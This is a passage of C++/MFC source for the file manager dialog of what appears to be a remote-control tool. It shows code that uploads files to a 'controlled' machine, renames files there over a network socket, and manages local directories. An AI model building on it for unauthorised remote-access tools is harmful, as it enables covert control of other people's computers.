				NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

			if (FileHanlde == INVALID_HANDLE_VALUE)
			{
				continue;
			}
			m_ServerFileToClientJob.AddTail(FileFullPath);

			CloseHandle(FileHanlde);
		}

	}
	if (m_ServerFileToClientJob.IsEmpty())
	{
		//如果选择有空目录是不处理
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK | MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendServerFileInformationToClient(); //发送第一个任务
	return VOID();
}

BOOL CFileManagerDlg::FixedServerFileToClient(LPCTSTR DircetoryFullPath)
{
	CHAR	BufferData[MAX_PATH];
	CHAR* v1 = NULL;
	memset(BufferData, 0, sizeof(BufferData));

	if (DircetoryFullPath[strlen(DircetoryFullPath) - 1] != '\\')
	{
		v1 = "\\";
	}

	else
	{
		v1 = "";
	}

	sprintf(BufferData, "%s%s*.*", DircetoryFullPath, v1);   // C:\HelloWorld\*.*    .  .. 1 2 3.txt

	WIN32_FIND_DATA	v2;
	HANDLE FileHandle = FindFirstFile(BufferData, &v2);
	if (FileHandle == INVALID_HANDLE_VALUE) //如果没有找到或查找失败
		return FALSE;
	do
	{
		//过滤这两个目录 '.'和'..'
		if (v2.cFileName[0] == '.')
		{
			continue;
		}

		if (v2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			CHAR v3[MAX_PATH];
			sprintf(v3, "%s%s%s", DircetoryFullPath, v1, v2.cFileName);
			FixedServerFileToClient(v3); //如果找到的是目录，则进入此目录进行递归 
		}
		else
		{
			CString FileFullPath;
			FileFullPath.Format("%s%s%s", DircetoryFullPath, v1, v2.cFileName);   //c:\helloWorld\3.txt   [] [] [] [] [] []
			m_ServerFileToClientJob.AddTail(FileFullPath);
			// 对文件进行操作 
		}
	} while (FindNextFile(FileHandle, &v2));
	FindClose(FileHandle); //关闭查找句柄
	return true;
}

void CFileManagerDlg::EnableControl(BOOL IsEnable)
{
	m_ServerFileList.EnableWindow(IsEnable);
	m_ClientFileList.EnableWindow(IsEnable);
	m_ServerFileCombo.EnableWindow(IsEnable);
	m_ClientFileCombo.EnableWindow(IsEnable);
}

BOOL CFileManagerDlg::SendServerFileInformationToClient()
{
	if (m_ServerFileToClientJob.IsEmpty())
	{
		return FALSE;
	}
	//C:\   m_ServerFullPath                       D:\  m_ClientFullPath
	//C;\1.txt


	CString	v1 = m_ClientFullPath;  //确认目标路径的父目录


	m_SourceFullPath = m_ServerFileToClientJob.GetHead();    //获得第一个任务的名称 

	DWORD	FileSizeHigh = 0;
	DWORD	FileSizeLow = 0;

	HANDLE	FileHandle;
	CString	v2 = m_SourceFullPath;               //远程文件

	//得到要保存到的远程的文件路径
	v2.Replace(m_ServerFullPath, m_ClientFullPath);  //D;\1.txt    C:\     D:\ 
	m_DestinationFullPath = v2;  //修正好的名字


	//E:\Hello\Hello\World\1.txt                           

	//打开本地文件
	FileHandle = CreateFile(m_SourceFullPath.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);   //获得要发送文件的大小
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	//大文件传送
	//获取文件大小
	FileSizeLow = GetFileSize(FileHandle, &FileSizeHigh);

	m_TransferFileLength = (FileSizeHigh * (MAXDWORD + 1)) + FileSizeLow;
	CloseHandle(FileHandle);
	//构造数据包，发送文件长度


	ULONG  BufferLength = v2.GetLength() + 10;
	BYTE* BufferData = (BYTE*)LocalAlloc(LPTR, BufferLength);
	memset(BufferData, 0, BufferLength);

	BufferData[0] = CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION;

	//[Flag 0001 0001 E:\1.txt\0 ]



	memcpy(BufferData + 1, &FileSizeHigh, sizeof(DWORD));
	memcpy(BufferData + 5, &FileSizeLow, sizeof(DWORD));



	memcpy(BufferData + 9, v2.GetBuffer(0), v2.GetLength() + 1);

	m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);

	LocalFree(BufferData);

	//从下载任务列表中删除自己
	m_ServerFileToClientJob.RemoveHead();
	return TRUE;
}

VOID CFileManagerDlg::SendServerFileDataToClient()
{
	FILE_SIZE* v1 = (FILE_SIZE*)(m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1));
	LONG	FileSizeHigh = v1->FileSizeHigh;    //0
	LONG	FileSizeLow = v1->FileSizeLow;      //0

	m_Counter = MAKEINT64(v1->FileSizeLow, v1->FileSizeHigh);   //0

	ShowProgress(); //通知进度条

	if (m_Counter == m_TransferFileLength || m_IsStop || v1->FileSizeLow == -1)
		//FileSize->SizeLow == -1  是对方选择了跳过    m_Counter == m_TransferFileLength  完成当前的传输
	{
		EndCopyServerFileToClient(); //进行下个任务的传送如果存在
		return;
	}

	HANDLE	FileHandle;
	FileHandle = CreateFile(m_SourceFullPath.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}
	//获取什么地方的数据
	SetFilePointer(FileHandle, FileSizeLow, &FileSizeHigh, FILE_BEGIN);   //8192    4G  300  设置文件大小

	int		v3 = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	DWORD	NumberOfBytesToRead = MAX_SEND_BUFFER - v3;
	DWORD	NumberOfBytesRead = 0;
	BYTE* BufferData = (BYTE*)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	if (BufferData == NULL)
	{
		CloseHandle(FileHandle);
		return;
	}
	BufferData[0] = CLIENT_FILE_MANAGER_FILE_DATA;
	memcpy(BufferData + 1, &FileSizeHigh, sizeof(FileSizeHigh));
	memcpy(BufferData + 5, &FileSizeLow, sizeof(FileSizeLow));

	//从文件中读取数据
	ReadFile(FileHandle, BufferData + v3, NumberOfBytesToRead, &NumberOfBytesRead, NULL);
	CloseHandle(FileHandle);

	if (NumberOfBytesRead > 0)
	{
		ULONG	BufferLength = NumberOfBytesRead + v3;
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
	}
	LocalFree(BufferData);
}

void CFileManagerDlg::ShowProgress()
{
	if ((int)m_Counter == -1)
	{
		m_Counter = m_TransferFileLength;
	}

	int	Progress = (float)(m_Counter * 100) / m_TransferFileLength;
	m_ProgressCtrl->SetPos(Progress);


	if (m_Counter == m_TransferFileLength)
	{
		m_Counter = m_TransferFileLength = 0;
	}
}

VOID CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg	Dialog(this);
	Dialog.m_FileFullPath = m_DestinationFullPath;
	switch (Dialog.DoModal())
	{
	case IDC_COVER_BUTTON:
	{
		m_TransferMode = TRANSFER_MODE_COVER;
		break;
	}
	case IDC_ALL_COVER_BUTTON:
	{
		m_TransferMode = TRANSFER_MODE_COVER_ALL;
		break;
	}

	case IDC_JMP_BUTTON:
	{
		m_TransferMode = TRANSFER_MODE_JUMP;
		break;
	}

	case IDC_ALL_JMP_BUTTON:
	{
		m_TransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	}

	case IDC_CANCEL_BUTTON:
	{
		m_TransferMode = TRANSFER_MODE_CANCEL;
		break;

	}

	}
	if (m_TransferMode == TRANSFER_MODE_CANCEL)
	{

		EndCopyServerFileToClient();
		return;
	}

	if (m_TransferMode == TRANSFER_MODE_NORMAL)
	{
		//关闭窗口


		m_IsStop = TRUE;
		EndCopyServerFileToClient();
		return;

	}

	BYTE IsToken[5];
	IsToken[0] = CLIENT_FILE_MANAGER_SET_TRANSFER_MODE;
	memcpy(IsToken + 1, &m_TransferMode, sizeof(m_TransferMode));
	m_IocpServer->OnPrepareSending(m_ContextObject, (unsigned char*)&IsToken, sizeof(IsToken));
}

VOID CFileManagerDlg::EndCopyServerFileToClient()
{
	m_Counter = 0;
	m_TransferFileLength = 0;

	//进度条
	ShowProgress();
	if (m_ServerFileToClientJob.IsEmpty() || m_IsStop)
	{

		m_ServerFileToClientJob.RemoveAll();
		m_IsStop = FALSE;
		EnableControl(TRUE);       //用户可以点击控件


		m_TransferMode = TRANSFER_MODE_NORMAL;

		GetClientFileList(".");   //刷新当前文件路径列表  //[..][.]
	}
	else
	{
		Sleep(5);

		SendServerFileInformationToClient();   //正常的传输完毕 进行下一个文件的传输
	}
	return;
}

void CFileManagerDlg::OnServerFilePrevious()
{
	FixedServerFileList("..");
}

void CFileManagerDlg::OnServerFileDelete()
{
	CString v1;
	if (m_ServerFileList.GetSelectedCount() > 1)
		v1.Format(_T("确定要将这 %d 项删除吗?"), m_ServerFileList.GetSelectedCount());
	else
	{

		int Item = m_ServerFileList.GetSelectionMark();

		if (Item == -1)
		{
			return;
		}
		CString FileName = m_ServerFileList.GetItemText(m_ServerFileList.GetSelectionMark(), 0);

		//删除的是不是目录
		if (m_ServerFileList.GetItemData(Item) == 1)
		{
			v1.Format(_T("确实要删除文件夹“%s”并将所有内容删除吗?"), FileName);
		}
		else
		{
			v1.Format(_T("确实要把“%s”删除吗?"), FileName);
		}
	}
	if (::MessageBox(m_hWnd, v1, _T("确认删除"), MB_YESNO | MB_ICONQUESTION) == IDNO)
	{
		return;
	}
	//不能让用户乱点
	EnableControl(FALSE);

	POSITION Position = m_ServerFileList.GetFirstSelectedItemPosition();
	while (Position)
	{
		int Item = m_ServerFileList.GetNextSelectedItem(Position);
		CString	FileFullPath = m_ServerFullPath + m_ServerFileList.GetItemText(Item, 0);
		//如果是目录
		if (m_ServerFileList.GetItemData(Item))
		{
			FileFullPath += '\\';
			DeleteDirectory(FileFullPath);
		}
		else
		{
			DeleteFile(FileFullPath);
		}
	}
	// 禁用文件管理窗口
	EnableControl(TRUE);
	//刷新数据
	FixedServerFileList(".");
}

void CFileManagerDlg::OnServerNewFolder()
{
	if (m_ServerFullPath == "")
	{
		return;
	}

	CFileNewFolder  Dialog(this);
	if (Dialog.DoModal() == IDOK && Dialog.m_NewFolderEdit.GetLength())
	{
		// 创建多层目录


		CString  v1;
		v1 = m_ServerFullPath + Dialog.m_NewFolderEdit + _T("\\");
		CreateDirectory(v1.GetBuffer());
		FixedServerFileList(".");
	}
}

void CFileManagerDlg::OnServerFileStop()
{
}

void CFileManagerDlg::OnServerFileViewBig()
{
	m_ServerFileList.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

void CFileManagerDlg::OnServerFileViewSmall()
{
	m_ServerFileList.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}

void CFileManagerDlg::OnServerFileViewList()
{
	m_ServerFileList.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}

void CFileManagerDlg::OnServerFileViewDetail()
{
	m_ServerFileList.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}

void CFileManagerDlg::OnClientFilePrevious()
{
	GetClientFileList("..");
}

void CFileManagerDlg::OnClientFileStop()
{
}

VOID CFileManagerDlg::DropFileOnList()
{
	//判断是从哪里拷贝数据到哪里
	if (m_Drag == m_Drop)
	{
		return;
	}

	if ((CWnd*)m_Drop == &m_ServerFileList)       //客户端向主控端
	{

		//OnCopyClientFileToServer();
	}
	else if ((CWnd*)m_Drop == &m_ClientFileList)  //主控端向客户端
	{
		CopyServerFileToClient();
	}
	else
	{
		return;
	}
}

void CFileManagerDlg::OnLvnEndlabeleditServerFileList(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMLVDISPINFO* pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CString NewFileName, ExistingFileFullPath, NewFileFullPath;
	m_ServerFileList.GetEditControl()->GetWindowText(NewFileName);
	ExistingFileFullPath = m_ServerFullPath + m_ServerFileList.GetItemText(pDispInfo->item.iItem, 0);
	NewFileFullPath = m_ServerFullPath + NewFileName;
	*pResult = ::MoveFile(ExistingFileFullPath.GetBuffer(0), NewFileFullPath.GetBuffer(0));
}


void CFileManagerDlg::OnLvnEndlabeleditClientFileList(NMHDR* pNMHDR, LRESULT* pResult)
{
	NMLVDISPINFO* pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CString NewFileName, ExistingFileFullPath, NewFileFullPath;
	m_ClientFileList.GetEditControl()->GetWindowText(NewFileName);

	ExistingFileFullPath = m_ClientFullPath + m_ClientFileList.GetItemText(pDispInfo->item.iItem, 0);
	NewFileFullPath = m_ClientFullPath + NewFileName;

	if (ExistingFileFullPath != NewFileFullPath)
	{
		UINT   BufferLength = ExistingFileFullPath.GetLength() + NewFileFullPath.GetLength() + 3;
		LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);
		BufferData[0] = CLIENT_FILE_MANAGER_FILE_RENAME_REQUIRE;                                                                   //向被控端发送消息
		memcpy(BufferData + 1, ExistingFileFullPath.GetBuffer(0), ExistingFileFullPath.GetLength() + 1);
		memcpy(BufferData + 2 + ExistingFileFullPath.GetLength(),
			NewFileFullPath.GetBuffer(0), NewFileFullPath.GetLength() + 1);
		m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
		LocalFree(BufferData);
		GetClientFileList(".");
	}
	*pResult = 0;
}


void CFileManagerDlg::OnNMRClickServerFileList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu	Menu;
	Menu.LoadMenu(IDR_SERVER_FILE_OPERATION_MENU);
	CMenu* SubMenu = Menu.GetSubMenu(0);
	CPoint	Point;
	GetCursorPos(&Point);
	SubMenu->DeleteMenu(2, MF_BYPOSITION);
	if (m_ServerFileList.GetSelectedCount() == 0)
	{
		int	iCount = SubMenu->GetMenuItemCount();
		for (int i = 0; i < iCount; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}

	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
	*pResult = 0;
}


void CFileManagerDlg::OnServerFileRun()
{
	// TODO: 在此添加命令处理程序代码
	CString	FileFullPath;
	FileFullPath = m_ServerFullPath + m_ServerFileList.GetItemText(m_ServerFileList.GetSelectionMark(), 0);
	ShellExecute(NULL, _T("open"), FileFullPath, NULL, NULL, SW_SHOW);   //CreateProcess 
}
